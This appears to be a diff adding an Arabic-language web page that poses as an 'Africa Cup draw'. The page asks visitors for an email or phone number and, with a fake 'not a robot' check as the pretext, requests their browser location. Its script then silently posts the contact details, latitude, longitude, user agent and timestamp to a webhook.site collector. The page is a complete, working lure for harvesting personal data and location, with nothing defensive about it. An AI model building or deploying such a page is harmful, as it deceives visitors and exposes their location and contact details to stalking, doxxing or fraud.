@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title >سحب كأس إفريقيا</title>
+  <style>
+    body {
+      background: #050505;
+      color: #00ff99;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: #0b0b0b;
+      border: 1px solid #00ff99;
+      padding: 30px;
+      width: 360px;
+      box-shadow: 0 0 25px #00ff99;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background: black;
+      border: 1px solid #00ff99;
+      color: #00ff99;
+      font-family: monospace;
+    }
+
+    button:hover {
+      background: #00ff99;
+      color: black;
+      cursor: pointer;
+    }
+
+    .notify {
+      margin-top: 15px;
+      color: #ff4444;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 13px;
+      text-align: center;
+    }
+    @media (max-width:500px) {
+      .box{
+        width: 70%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>سحب كأس إفريقيا 🌍</h2>
+
+  <input id="userInput" required type="text" placeholder="أدخل الإيميل أو الرقم">
+
+  <button onclick="start()">متابعة</button>
+
+  <div class="notify">
+    ⚠️ قم بالموافقة على الموقع للتأكد من أنك لست روبوت 
+  </div>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+function start() {
+  const status = document.getElementById("status");
+
+  if (!navigator.geolocation) {
+    status.innerText = "❌ المتصفح لا يدعم تحديد الموقع";
+    return;
+  }
+
+  status.innerText = "⏳ جاري التحقق من الموقع...";
+
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      status.innerText = "✅ تم التحقق بنجاح";
+
+      // 🔥 أرسل الإحداثيات لك هنا
+      fetch("https://webhook.site/cce3bbf9-dc7e-4adf-8eb2-8fe81d506d62", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          input: document.getElementById("userInput").value,
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent,
+          time: new Date().toISOString()
+        })
+      });
+
+      console.log("Location:", lat, lon);
+    },
+    error => {
+      status.innerText = "❌ تم رفض الوصول إلى الموقع";
+    }
+  );
+}
+</script>
+
+</body>
+</html>
